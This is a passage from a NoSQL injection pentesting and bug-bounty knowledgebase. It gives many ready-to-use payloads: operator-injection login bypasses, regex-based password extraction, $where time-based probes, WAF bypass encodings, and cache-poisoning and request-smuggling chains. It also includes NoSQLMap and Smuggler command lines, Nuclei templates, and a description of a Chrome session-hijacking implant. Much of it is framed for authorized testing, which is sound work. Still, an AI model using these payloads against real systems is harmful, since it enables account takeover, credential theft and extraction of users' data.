X-Original-URL: /admin

HTTP/1.1 200 OK
Please log in
```

**Cache Poisoning:**
```
GET /education?x=y HTTP/1.1
Host: target.com
X-Original-URL: /gambling?x=y
```

Cache key is `/education?x=y` but content served is from `/gambling?x=y`.

---

## Fuzzing Payloads

### NoSQL Injection Wordlists

**cr0hn/nosqlinjection_wordlists** provides comprehensive payload collections:
- MongoDB operator payloads
- CouchDB payloads
- Redis payloads
- Cassandra payloads
- Generic NoSQL fuzzing strings

### SecLists Fuzzing Wordlists

**danielmiessler/SecLists** includes:
- `Fuzzing/URI-XSS.fuzzdb.txt` — XSS in URI fuzzing
- `Fuzzing/fully-qualified-java-classes.txt` — Deserialization/type confusion
- `Discovery/Web-Content/` — Directory/file brute-forcing
- `Discovery/Web-Content/reverse-proxy-inconsistencies.txt` — Backend admin interfaces

### Custom NoSQL Fuzzing Payloads

```
// Basic operator injection
username[$ne]=1
password[$gt]=
email[$regex]=.*
role[$in][]=admin

// JavaScript injection
username[$where]=1
password[$where]=sleep(5000)

// Aggregation injection
pipeline[0][$match][username][$ne]=null
pipeline[0][$match][$expr][$eq]=["$role","admin"]

// Type confusion
username=0
username=true
username=null
username=[]
username={}

// Null byte truncation
username=admin%00
password=anything

// Duplicate keys
{"username":"admin","username":{"$ne":null}}

// BSON type confusion
{"_id":{"$oid":"507f1f77bcf86cd799439011"}}
{"createdAt":{"$date":"2024-01-01T00:00:00Z"}}
```

---

## Automation Workflows

### NoSQLMap Automated Scanning

**Features:**
- Automated NoSQL database enumeration
- Web application exploitation
- Default configuration weakness exploitation
- MongoDB and CouchDB support
- Burp request import

**Usage:**
```bash
# Interactive mode
python NoSQLMap

# Set options
1 - Set target host/IP
2 - Set web app port
3 - Set URI Path
4 - Toggle HTTPS
5 - Set MongoDB Port
6 - Set HTTP Request Method

# Attack modes
2 - NoSQL DB Access Attacks
3 - NoSQL Web App attacks
4 - Scan for Anonymous MongoDB Access

# CLI mode
docker-compose run --remove-orphans nosqlmap \
    --attack 2 \
    --victim target.com \
    --webPort 8080 \
    --uri "/login?username=test" \
    --httpMethod GET \
    --params 1 \
    --injectSize 4 \
    --injectFormat 2 \
    --doTimeAttack n
```

### Burp Suite NoSQLi Scanner Extension

**matrix/Burp-NoSQLiScanner** — Automated NoSQL injection discovery:
1. Install via BApp Store
2. Right-click request → "Scan for NoSQLi"
3. Extension tests operator injection, JavaScript injection, time-based detection
4. Reports findings as scan issues

### Nuclei NoSQLi Templates

**projectdiscovery/nuclei-templates** provides:
- `http/vulnerabilities/nosqli/` — NoSQL injection detection templates
- Automated scanning with YAML-based templates
- Supports custom templates for specific applications

**Basic template structure:**
```yaml
id: nosqli-login-bypass

info:
  name: NoSQL Injection Login Bypass
  author: yourname
  severity: high

requests:
  - raw:
      - |
        POST /api/login HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {"username":{"$ne":null},"password":{"$ne":null}}

    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "token"
          - "session"
        condition: or
```

---

## Recon Methodology

### Phase 1: Technology Identification

1. **Identify NoSQL database:**
   - Check response headers (`X-Powered-By`, `Server`)
   - Error messages (MongoDB, CouchDB specific)
   - URL patterns (`/api/`, `/graphql`, REST endpoints)
   - Technology stacks (Node.js + MongoDB, Python + MongoDB)

2. **Identify query construction:**
   - Review API documentation
   - Analyze request/response patterns
   - Check for JSON bodies, URL parameters
   - Look for operator patterns in responses

### Phase 2: Injection Point Discovery

1. **Test URL parameters:**
   ```
   GET /api/users?username[$ne]=test
   GET /api/users?username[$gt]=
   GET /api/users?username[$regex]=.*
   ```

2. **Test JSON bodies:**
   ```json
   {"username": {"$ne": "test"}, "password": "test"}
   ```

3. **Test form data:**
   ```
   username[$ne]=test&password=test
   ```

4. **Test headers:**
   ```
   X-User-Id: {"$ne": null}
   ```

### Phase 3: Confirmation

1. **Boolean-based confirmation:**
   - True condition should return data
   - False condition should return no data

2. **Error-based confirmation:**
   - Trigger syntax errors
   - Look for database-specific error messages

3. **Time-based confirmation:**
   - Use `$where` with `sleep()`
   - Measure response time differences

### Phase 4: Exploitation

1. **Authentication bypass**
2. **Data extraction** (blind extraction with regex)
3. **Data enumeration** (field names, collection names)
4. **Privilege escalation**
5. **Chain with other vulnerabilities**

---

## Nuclei Templates

### Basic NoSQLi Detection Template

```yaml
id: nosqli-basic-detection

info:
  name: Basic NoSQL Injection Detection
  author: researcher
  severity: high
  description: Detects basic NoSQL injection via operator injection
  reference:
    - https://portswigger.net/web-security/nosql-injection

dns:
  - name: "{{FQDN}}"
    type: A

requests:
  - raw:
      - |
        POST /api/login HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {"username":{"$ne":"invalid"},"password":{"$ne":"invalid"}}

    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "token"
          - "session"
          - "authenticated"
          - "success"
        condition: or
      - type: word
        negative: true
        words:
          - "invalid"
          - "error"
          - "unauthorized"
```

### Time-Based NoSQLi Template

```yaml
id: nosqli-time-based

info:
  name: Time-Based NoSQL Injection
  author: researcher
  severity: high

requests:
  - raw:
      - |
        POST /api/search HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {"search":{"$where":"sleep(5000)"}}

    matchers:
      - type: dsl
        dsl:
          - "duration>=5"
```

### Regex-Based Data Extraction Template

```yaml
id: nosqli-regex-extraction

info:
  name: NoSQL Injection Regex Data Extraction
  author: researcher
  severity: critical

requests:
  - raw:
      - |
        POST /api/users HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {"username":"admin","password":{"$regex":"^a.*"}}

    matchers:
      - type: word
        words:
          - "admin"
          - "user"
        condition: or
```

---

## Tools and Scanners

### NoSQLMap

**GitHub:** `codingo/NoSQLMap`

Automated NoSQL database enumeration and web application exploitation.

**Features:**
- MongoDB and CouchDB support
- Web app attacks (GET/POST)
- DB access attacks
- Anonymous MongoDB scanning
- Burp request import
- Docker support

**Installation:**
```bash
git clone https://github.com/codingo/NoSQLMap.git
cd NoSQLMap
python setup.py install
# OR
docker build -t nosqlmap .
```

### Burp-NoSQLiScanner

**GitHub:** `matrix/Burp-NoSQLiScanner`

Burp Suite extension for NoSQL injection discovery.

**Features:**
- Automated scanning
- Operator injection detection
- JavaScript injection detection
- Time-based detection
- Integration with Burp Scanner

**Installation:**
1. Download JAR from releases
2. Burp → Extender → Extensions → Add
3. Select JAR file

### Smuggler

**GitHub:** `defparam/smuggler`

HTTP Request Smuggling / Desync testing tool.

**Features:**
- CL.TE and TE.CL detection
- Multiple mutation techniques
- Custom configuration files
- Payload export for Turbo Intruder
- Piped input for bulk scanning

**Usage:**
```bash
python3 smuggler.py -u https://target.com
python3 smuggler.py -u https://target.com -m POST
python3 smuggler.py -u https://target.com -c custom.py
cat hosts.txt | python3 smuggler.py
```

### HTTP Request Smuggler (Burp Extension)

**GitHub:** `PortSwigger/http-request-smuggler`

Burp Suite extension for HTTP desync detection and exploitation.

**Features:**
- CL.TE and TE.CL detection
- HTTP/2 desync support
- Client-side desync detection
- Automated exploit generation
- Turbo Intruder integration

**Usage:**
1. Right-click request → "Launch Smuggle probe"
2. Wait for probe completion
3. If vulnerable, right-click → "Smuggle attack"
4. Edit `prefix` variable for payload

### Param Miner

**GitHub:** `PortSwigger/param-miner`

Identifies hidden, unlinked parameters for cache poisoning.

**Features:**
- Guesses up to 65,000 param names per request
- Binary search technique
- Built-in wordlist + harvested words
- Auto-mining of in-scope traffic
- Web cache entanglement detection

**Usage:**
1. Right-click request → "Guess (cookies|headers|params)"
2. Review Extender → Extensions → Param Miner → Output
3. Enable auto-mining for continuous discovery

### CursedChrome

**GitHub:** `mandatoryprogrammer/CursedChrome`

Chrome extension implant for session hijacking.

**Features:**
- Turns victim browsers into HTTP proxies
- Authenticated browsing as victim
- Cookie synchronization
- WebSocket-based control
- Docker-compose deployment

### postMessage Tracker

**GitHub:** `fransr/postMessage-tracker`

Chrome extension for `postMessage` monitoring.

**Features:**
- Tracks `postMessage` listeners
- Logs URL, domain, stack
- Supports wrapper bypass (Raven, New Relic, etc.)
- Remote logging capability
- Anonymous function support

### PP-Finder

**GitHub:** `yeswehack/pp-finder`

Prototype pollution gadget finder.

**Features:**
- AST-based gadget detection
- Runtime instrumentation
- Lazy start/stop control
- Multiple transformer types
- Node.js and browser support

**Usage:**
```bash
npm install -g pp-finder
pp-finder run node ./app.js
# Or with lazy start
node --loader pp-finder ./app.js
```

---

## Advanced Research

### MongoDB NoSQL Injection with Aggregation Pipelines

**Researcher:** Soroush Dalili (@irsdl) — June 2024

Aggregation pipelines introduce new injection vectors:
- `$expr` with aggregation expressions in `find()` queries
- `$function` operator for JavaScript execution (MongoDB 4.4+)
- `$lookup` with sub-pipelines
- `$redact` for conditional document filtering

**Key insight:** Aggregation stages can be injected even when the primary query is sanitized, if user input reaches any stage of the pipeline.

### NoSQL Error-Based Injection

**Researcher:** Reino Mostert — March 2025

Error messages in NoSQL databases can leak:
- Field names
- Collection names
- Database structure
- JavaScript execution errors

**Technique:**
```javascript
{"$where": "this.nonexistent_field"}  // Triggers error with field info
{"$where": "db.collection.find()"}    // May leak collection names
```

### Getting Rid of Pre- and Post-Conditions in NoSQL Injections

**Researcher:** Reino Mostert — March 2025

Techniques to bypass query pre-conditions (e.g., `AND released == 1`):

1. **Null byte truncation:**
   ```
   category=fizzy%00
   ```
   MongoDB ignores everything after null byte.

2. **Duplicate key precedence:**
   ```json
   {"id": "10", "id": {"$ne": null}}
   ```
   Last key overrides previous restrictions.

3. **Type confusion:**
   ```json
   {"released": 0}  // Integer 0 may bypass string checks
   ```

### HTTP/1.1 Must Die: The Desync Endgame

**Researcher:** James Kettle (PortSwigger) — 2025

HTTP Request Smuggler v3.0 introduces parser discrepancy detection:
- Bypasses widespread desync defenses
- Root-cause detection of parsing discrepancies
- More reliable and resistant to target-specific quirks

**Impact on NoSQLi:** Desync attacks can smuggle NoSQLi payloads past front-end security controls that would otherwise block them.

### Browser-Powered Desync Attacks

**Researcher:** James Kettle (PortSwigger)

Client-Side Desync (CSD) attacks use the browser as the desync agent:
1. Browser sends malformed request
2. Front-end processes it differently than back-end
3. Back-end reads attacker's next request as part of the body
4. Attacker's request gets prefixed with victim's credentials

**NoSQLi chain:** CSD can poison connection pools to inject NoSQLi payloads with victim authentication.

### Web Cache Entanglement

**Researcher:** James Kettle (PortSwigger) — 2020

Cache layers can be entangled to amplify attacks:
- Poison one cache layer → affects multiple layers
- Fat GET requests bypass cache key inclusion
- Internal caches (application-level) often lack proper keying

**NoSQLi application:** Poison cache with NoSQLi payload that gets executed against internal APIs.

---

## Bug Bounty Writeups

### Key NoSQLi Bug Bounty Resources

**0xspade/bugbounty** — NoSQLi-specific bounty techniques:
- Parameter pollution for NoSQLi
- Header-based NoSQLi
- JSON parsing confusion
- WAF bypass techniques

### Common NoSQLi Bounty Patterns

1. **Login bypass → Account takeover:**
   - Use `$ne` or `$gt` to bypass authentication
   - Extract password via regex
   - Take over admin account

2. **API endpoint → Data exfiltration:**
   - Find unauthenticated API endpoints
   - Inject operators to bypass filters
   - Extract user data, PII, credentials

3. **GraphQL → NoSQLi:**
   - GraphQL resolvers often construct NoSQL queries
   - Inject operators in GraphQL variables
   - Bypass authorization checks

4. **Webhook/Callback → NoSQLi:**
   - Webhook payloads stored in NoSQL
   - Inject operators in callback data
   - Modify stored data or trigger queries

### Bounty Tips

- **Always test both JSON and URL-encoded formats**
- **Check for operator injection in nested objects**
- **Test time-based detection when error-based fails**
- **Look for NoSQLi in secondary APIs (webhooks, callbacks, internal APIs)**
- **Chain with cache poisoning for higher impact**
- **Document the full exploit chain, not just the injection point**

---

## Payload Collections

### PayloadsAllTheThings NoSQL Injection

**GitHub:** `swisskyrepo/PayloadsAllTheThings/NoSQL Injection`

Comprehensive payload collection including:
- Operator injection payloads
- Authentication bypass payloads
- Data extraction payloads
- Blind NoSQLi scripts (Python, Ruby)
- WAF bypass techniques
- Wordlists and dictionaries

### NoSQL Injection Payload List

**GitHub:** `payloadbox/nosql-injection-payload-list`

Curated list of NoSQL injection payloads for:
- MongoDB
- CouchDB
- Redis
- Cassandra
- Generic NoSQL databases

### cr0hn NoSQL Injection Wordlists

**GitHub:** `cr0hn/nosqlinjection_wordlists`

Specialized wordlists for:
- MongoDB operators
- CouchDB operators
- Redis commands
- NoSQL fuzzing strings
- Error-based detection strings

---

## WAF Bypasses

### Common WAF Filters and Bypasses

| Filter | Bypass Technique |
|--------|-------------------|
| Block `$ne` | Use `$gt`, `$gte`, `$lt`, `$lte` |
| Block `$regex` | Use `$in` with array of patterns |
| Block `$where` | Use `$expr` with `$function` |
| Block `sleep` | Use date-based busy loops |
| Block operators in JSON | Use URL-encoded form data |
| Block URL parameters | Use JSON body |
| Block JSON body | Use Content-Type confusion |
| Block null bytes | Use Unicode null (`\u0000`) |
| Block `$` | Use array indices or nested objects |

### Advanced WAF Bypass Techniques

1. **Unicode normalization:**
   ```
   username=%24ne=admin  // $ encoded as %24
   ```

2. **JSON parsing quirks:**
   ```json
   {"username": {"\u0024ne": "admin"}}  // Unicode $ne
   ```

3. **Comment injection:**
   ```javascript
   {"username": "admin/*", "password": {"$ne": null}}
   ```

4. **Nested object bypass:**
   ```json
   {"username": {"$not": {"$eq": "invalid"}}}
   ```

5. **Array operator bypass:**
   ```
   username[0]=admin&username[1][$ne]=invalid
   ```

6. **Duplicate key bypass:**
   ```json
   {"username": "admin", "username": {"$ne": "invalid"}}
   ```

---

## Detection Techniques

### Automated Detection

1. **Send benign request → baseline response**
2. **Send payload with `$ne` operator → compare response**
3. **Send payload with `$where` and `sleep` → time comparison**
4. **Send payload with `$regex` → pattern matching comparison**

### Manual Detection Checklist

- [ ] Test URL parameters with operators (`?field[$ne]=value`)
- [ ] Test JSON body with operators (`{"field": {"$ne": "value"}}`)
- [ ] Test form data with operators (`field[$ne]=value`)
- [ ] Test headers with operators (`X-Field: {"$ne": null}`)
- [ ] Test nested objects (`{"user": {"name": {"$ne": "test"}}}`)
- [ ] Test arrays (`{"field": {"$in": ["value1", "value2"]}}`)
- [ ] Test JavaScript injection (`{"$where": "1"}`)
- [ ] Test time-based detection (`{"$where": "sleep(5000)"}`)
- [ ] Test error-based detection (trigger syntax errors)
- [ ] Test with different Content-Types
- [ ] Test with parameter pollution
- [ ] Test with null bytes
- [ ] Test with duplicate keys

### Response Analysis

| Indicator | Likely Vulnerability |
|-----------|---------------------|
| Different response size for true/false | Boolean-based blind NoSQLi |
| Different response time | Time-based NoSQLi |
| Database error messages | Error-based NoSQLi |
| Authentication bypass | Operator injection |
| Data leakage | Successful extraction |
| Server crash | Denial of Service |

---

## References

### PortSwigger Web Security Academy

- [NoSQL injection](https://portswigger.net/web-security/nosql-injection)
- [NoSQL injection lab — detection](https://portswigger.net/web-security/nosql-injection/lab-nosql-injection-detection)
- [NoSQL injection lab — authentication bypass](https://portswigger.net/web-security/nosql-injection/lab-nosql-injection-bypass-authentication)
- [NoSQL injection lab — extract data](https://portswigger.net/web-security/nosql-injection/lab-nosql-injection-extract-data)
- [NoSQL injection lab — operator injection](https://portswigger.net/web-security/nosql-injection/lab-nosql-injection-operator-injection)
- [Server-Side Template Injection](https://portswigger.net/research/server-side-template-injection)
- [Browser-Powered Desync Attacks](https://portswigger.net/research/browser-powered-desync-attacks)
- [HTTP Desync Attacks: Request Smuggling Reborn](https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn)
- [Web Cache Entanglement](https://portswigger.net/research/web-cache-entanglement)
- [Practical Web Cache Poisoning](https://portswigger.net/research/practical-web-cache-poisoning)
- [Hidden OAuth Attack Vectors](https://portswigger.net/research/hidden-oauth-attack-vectors)

### HackTricks

- [NoSQL Injection](https://book.hacktricks.wiki/en/pentesting-web/nosql-injection.html)

### MongoDB Documentation

- [Query Operators](https://www.mongodb.com/docs/manual/reference/operator/query/)
- [Aggregation Pipeline Stages](https://www.mongodb.com/docs/manual/reference/operator/aggregation/)

### MDN Web Docs

- [JSON.parse()](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/JSON/parse)
- [Fetch API](https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API)

### GitHub Repositories

- [PayloadsAllTheThings/NoSQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection)
- [NoSQLMap](https://github.com/codingo/NoSQLMap)
- [nosqlinjection_wordlists](https://github.com/cr0hn/nosqlinjection_wordlists)
- [nosql-injection-payload-list](https://github.com/payloadbox/nosql-injection-payload-list)
- [nuclei-templates](https://github.com/projectdiscovery/nuclei-templates)
- [nuclei](https://github.com/projectdiscovery/nuclei)
- [param-miner](https://github.com/PortSwigger/param-miner)
- [http-request-smuggler](https://github.com/PortSwigger/http-request-smuggler)
- [smuggler](https://github.com/defparam/smuggler)
- [CursedChrome](https://github.com/mandatoryprogrammer/CursedChrome)
- [client-side-prototype-pollution](https://github.com/BlackFan/client-side-prototype-pollution)
- [postMessage-tracker](https://github.com/fransr/postMessage-tracker)
- [pp-finder](https://github.com/yeswehack/pp-finder)
- [SecLists](https://github.com/danielmiessler/SecLists)

### Research Papers

- **MongoDB NoSQL Injection with Aggregation Pipelines** — Soroush Dalili (@irsdl), June 2024
- **NoSQL Error-Based Injection** — Reino Mostert, March 2025
- **Getting Rid of Pre- and Post-Conditions in NoSQL Injections** — Reino Mostert, March 2025
- **HTTP/1.1 Must Die: The Desync Endgame** — James Kettle, 2025
- **Practical Web Cache Poisoning** — James Kettle, 2018
- **Web Cache Entanglement** — James Kettle, 2020
- **Browser-Powered Desync Attacks** — James Kettle
- **Hidden OAuth Attack Vectors** — PortSwigger Research, 2021

### Labs

- [PortSwigger Web Security Academy — NoSQLi Labs](https://portswigger.net/web-security/nosql-injection)
- [Root Me — NoSQL injection - Authentication](https://www.root-me.org/)
- [Root Me — NoSQL injection - Blind](https://www.root-me.org/)
- [digininja/nosqlilab](https://github.com/digininja/nosqlilab)

### OWASP

- [Testing for NoSQL Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection.html)

---

## Quick Reference Card

### Detection Payloads

```
# Boolean-based
?username[$ne]=invalid
?username[$gt]=
?username[$regex]=.*

# Time-based
{"$where":"sleep(5000)"}

# Error-based
{"$where":"this.nonexistent"}

# Authentication bypass
{"username":{"$ne":null},"password":{"$ne":null}}
```

### Extraction Payloads

```
# Length check
{"username":"admin","password":{"$regex":".{8}"}}

# Character extraction
{"username":"admin","password":{"$regex":"^a"}}

# Field enumeration
{"$where":"Object.keys(this)[0].match('^.{0}a.*')"}
```

### WAF Bypass Payloads

```
# Unicode encoding
{"username":{"\u0024ne":"admin"}}

# Duplicate keys
{"username":"admin","username":{"$ne":"invalid"}}

# Null byte
username=admin%00

# Array indices
username[0]=admin&username[1][$ne]=invalid
```

### Chain Payloads

```
# Cache poisoning + NoSQLi
GET /api/users?username=admin HTTP/1.1
Host: target.com
X-Custom-Header: {"$ne":null}

# Request smuggling + NoSQLi
POST / HTTP/1.1
Content-Length: 53
Transfer-Encoding: chunked

17
=x&q=smuggling&x=
0

POST /api/login HTTP/1.1
Content-Type: application/json

{"username":{"$ne":null},"password":{"$ne":null}}
```

---

> **End of Knowledgebase**
> 
> This document is compiled from PortSwigger Web Security Academy, HackTricks, PayloadsAllTheThings, NoSQLMap, Nuclei templates, MongoDB documentation, and cutting-edge research papers. All content is for authorized security testing and bug bounty hunting only.
